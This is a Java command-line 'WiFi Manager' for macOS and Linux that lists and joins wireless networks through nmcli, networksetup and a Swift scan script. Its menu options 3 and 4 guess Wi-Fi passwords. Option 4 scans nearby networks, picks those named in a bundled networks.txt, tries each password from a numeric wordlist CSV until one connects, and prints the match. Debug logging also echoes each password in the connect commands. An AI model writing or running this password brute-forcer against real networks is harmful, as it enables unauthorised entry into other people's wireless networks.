package org.example;

import java.io.BufferedReader;
import java.io.File;
import java.io.FileNotFoundException;
import java.io.FileOutputStream;
import java.io.InputStreamReader;
import java.util.ArrayList;
import java.util.List;
import java.util.Map;
import java.util.Scanner;
import java.util.TreeMap;
import java.util.stream.Stream;

// ---- CommandRunner.java ----
interface CommandRunner {
    String run(String command) throws Exception;
}

// ---- SystemCommandRunner.java ----
class SystemCommandRunner implements CommandRunner {
    @Override
    public String run(String command) throws Exception {
        WiFiManager.debug("Executing command: " + command);
        Process p = Runtime.getRuntime().exec(new String[]{ "/bin/sh", "-c", command });
        StringBuilder out = new StringBuilder(), err = new StringBuilder();
        try (var br = new BufferedReader(new InputStreamReader(p.getInputStream()))) {
            String l;
            while ((l = br.readLine()) != null) out.append(l).append("\n");
        }
        try (var br = new BufferedReader(new InputStreamReader(p.getErrorStream()))) {
            String l;
            while ((l = br.readLine()) != null) err.append(l).append("\n");
        }
        int exitCode = p.waitFor();
        WiFiManager.debug("Exit code: " + exitCode);
        WiFiManager.debug("Stdout (" + out.length() + " chars): " + out.toString().replace('\n', '|'));
        if (!err.toString().isBlank()) {
            WiFiManager.debug("Stderr: " + err);
            System.err.println("STDERR: " + err);
        }
        return out.toString();
    }
}

// ---- WiFiNetwork.java ----
record WiFiNetwork(String ssid, String signal) implements Comparable<WiFiNetwork> {
    @Override
    public int compareTo(WiFiNetwork o) {
        return String.CASE_INSENSITIVE_ORDER.compare(this.ssid, o.ssid);
    }
}

// ---- WiFiParser.java ----
class WiFiParser {

    static List<WiFiNetwork> parseMacOutput(String output) {
        WiFiManager.debug("Parsing macOS output (" + output.lines().count() + " lines)");
        List<WiFiNetwork> networks = new ArrayList<>();
        output.lines()
              .filter(l -> !l.isBlank() && l.contains("|"))
              .forEach(line -> {
                  String[] parts = line.split("\\|", 2);
                  if (parts.length == 2 && !parts[0].isBlank()) {
                      networks.add(new WiFiNetwork(parts[0], parts[1] + " dBm"));
                      WiFiManager.debug("  Parsed network: " + parts[0] + " / " + parts[1]);
                  } else {
                      WiFiManager.debug("  Skipped line: " + line);
                  }
              });
        WiFiManager.debug("Parsed " + networks.size() + " networks");
        return networks;
    }

    static List<WiFiNetwork> parseLinuxOutput(String output) {
        WiFiManager.debug("Parsing Linux output (" + output.lines().count() + " lines)");
        List<WiFiNetwork> networks = new ArrayList<>();
        output.lines()
              .filter(l -> !l.isBlank())
              .forEach(line -> {
                  String[] parts = line.split(":");
                  if (parts.length >= 2 && !parts[0].isBlank()) {
                      networks.add(new WiFiNetwork(parts[0], parts[1] + "%"));
                      WiFiManager.debug("  Parsed network: " + parts[0] + " / " + parts[1]);
                  } else {
                      WiFiManager.debug("  Skipped line: " + line);
                  }
              });
        WiFiManager.debug("Parsed " + networks.size() + " networks");
        return networks;
    }

    static List<WiFiNetwork> dedupAndSort(List<WiFiNetwork> networks) {
        Map<String, WiFiNetwork> unique = new TreeMap<>();
        for (WiFiNetwork n : networks) {
            unique.merge(n.ssid(), n, (old, nw) -> strength(nw) > strength(old) ? nw : old);
        }
        WiFiManager.debug("After dedup: " + networks.size() + " -> " + unique.size() + " networks");
        return new ArrayList<>(unique.values());
    }

    private static int strength(WiFiNetwork n) {
        try { return Integer.parseInt(n.signal().replace(" dBm", "").replace("%", "")); } catch (NumberFormatException e) { return Integer.MIN_VALUE; }
    }
}

// ---- WiFiConnector.java ----
class WiFiConnector {
    private final CommandRunner runner;
    private final boolean isMac;

    WiFiConnector(CommandRunner runner, boolean isMac) {
        this.runner = runner;
        this.isMac = isMac;
    }

    boolean tryConnect(String ssid, String password) {
        WiFiManager.debug("--->");
        WiFiManager.debug("Attempting connection to '" + ssid + "'");
        try {
            String cmd = isMac
                             ? "networksetup -setairportnetwork en0 " + quote(ssid) + " " + quote(password)
                             : "nmcli dev wifi connect " + quote(ssid) + " password " + quote(password);
            WiFiManager.debug("Connect command: " + cmd);
            String output = runner.run(cmd);
            boolean success = isMac
                                  ? output.isBlank()
                                  : output.toLowerCase().contains("successfully");
            WiFiManager.debug("Connection result: " + (success ? "SUCCESS" : "FAILED") + " | output: " + output.trim());
            return success;
        } catch (Exception e) {
            WiFiManager.debug("Connection exception: " + e.getMessage());
            return false;
        }
    }

    private static String quote(String s) {
        return "'" + s.replace("'", "'\\''") + "'";
    }
}

// ---- WiFiService.java ----
class WiFiService {
    private final CommandRunner runner;
    private final boolean isMac;

    WiFiService(CommandRunner runner, boolean isMac) {
        this.runner = runner;
        this.isMac = isMac;
        WiFiManager.debug("WiFiService created (isMac=" + isMac + ")");
    }

    List<WiFiNetwork> listNetworks() throws Exception {
        String output;
        List<WiFiNetwork> raw;

        if (isMac) {
            File tmp = File.createTempFile("wifi_scan", ".swift");
            tmp.deleteOnExit();
            WiFiManager.debug("Swift temp file: " + tmp.getAbsolutePath());
            try (var in = WiFiManager.class.getResourceAsStream("/wifi_scan.swift");
                 var out2 = new FileOutputStream(tmp)) {
                if (in == null) throw new FileNotFoundException("wifi_scan.swift not found in resources");
                in.transferTo(out2);
            }
            WiFiManager.debug("Swift file written, running...");
            output = runner.run("swift " + tmp.getAbsolutePath());
            raw = WiFiParser.parseMacOutput(output);
        } else {
            output = runner.run("nmcli -t -f SSID,SIGNAL dev wifi list");
            raw = WiFiParser.parseLinuxOutput(output);
        }
        return WiFiParser.dedupAndSort(raw);
    }

    String connect(String ssid, String password) throws Exception {
        WiFiManager.log("Connecting to: " + ssid);
        String cmd = isMac
                         ? "networksetup -setairportnetwork en0 " + quote(ssid) + " " + quote(password)
                         : "nmcli dev wifi connect " + quote(ssid) + " password " + quote(password);
        WiFiManager.debug("Connect command: " + cmd);
        String output = runner.run(cmd);
        return output.isBlank() ? "Connected to: " + ssid : output;
    }

    private static String quote(String s) {
        return "'" + s.replace("'", "'\\''") + "'";
    }
}

// ---- WiFiManager.java (entry point) ----
public class WiFiManager {

    static final boolean DEBUG_ENABLED = true;

    public static void main(String[] args) throws Exception {
        boolean isMac = System.getProperty("os.name").toLowerCase().contains("mac");
        debug("OS: " + System.getProperty("os.name") + " (isMac=" + isMac + ")");
        debug("Java: " + System.getProperty("java.version"));
        debug("User: " + System.getProperty("user.name"));

        WiFiService service = new WiFiService(new SystemCommandRunner(), isMac);
        Scanner sc = new Scanner(System.in);

        log("=== WiFi Manager (" + (isMac ? "macOS" : "Linux") + ") ===");
        log("1. List available WiFi networks");
        log("2. Connect to a WiFi network");
        log("3. Try passwords for a WiFi network");
        log("4. Try passwords for all WiFi networks");
        System.out.print("Choice: ");
        int choice = sc.nextInt();
        sc.nextLine();
        debug("User chose: " + choice);

        if (choice == 1) {
            log("Scanning...");
            List<WiFiNetwork> nets = service.listNetworks();
            log(String.format("  %-30s %s", "SSID", "SIGNAL"));
            log("  " + "-".repeat(40));
            nets.forEach(n -> log(String.format("  %-30s %s", n.ssid(), n.signal())));
            debug("Displayed " + nets.size() + " networks");
        } else if (choice == 2) {
            System.out.print("SSID: ");
            String ssid = sc.nextLine();
            System.out.print("Password: ");
            String pass = sc.nextLine();
            log(service.connect(ssid, pass));
        } else if (choice == 3) {
            WiFiConnector connector = new WiFiConnector(new SystemCommandRunner(), isMac);
            System.out.print("SSID: ");
            String ssid = sc.nextLine();
            log("Enter passwords to try (enter '0' to stop):");
            while (true) {
                System.out.print("Password: ");
                String pass = sc.nextLine();
                if ("0".equals(pass)) {
                    log("Stopped.");
                    break;
                }
                boolean ok = connector.tryConnect(ssid, pass);
                log(ok ? "SUCCESS - connected to " + ssid : "ERROR - wrong password or connection failed");
                if (ok) break;
            }
        } else if (choice == 4) {
            WiFiConnector connector = new WiFiConnector(new SystemCommandRunner(), isMac);
            List<WiFiNetwork> nets = service.listNetworks();

            List<String> forcedNetworks = resourceLines("/networks.txt").toList();

            List<String> targetNetworks = nets.stream()
                                              .map(WiFiNetwork::ssid).distinct()
                                              .filter(forcedNetworks::contains)
                                              .toList();
            var skippedPwdItems = 17;
            debug("Skipping first " + skippedPwdItems + " passwords");

            var matchPair = new MatchPair();

            matchPair.match(
                targetNetworks,
                CsvResource.column("/passwords_num.csv", 0, s -> s.length() > 7).skip(skippedPwdItems),
                connector::tryConnect,
                x -> System.out.println("Matched " + x)
            );
        }
    }

    static Stream<String> resourceLines(String path) {
        var in = WiFiManager.class.getResourceAsStream(path);
        if (in == null) throw new IllegalArgumentException("Resource not found: " + path);
        return new BufferedReader(new InputStreamReader(in)).lines();
    }

    static void log(String msg) {
        System.out.println(msg);
    }

    static void debug(String msg) {
        if (DEBUG_ENABLED) {
            System.out.println("[DEBUG] " + msg);
        }
    }
}
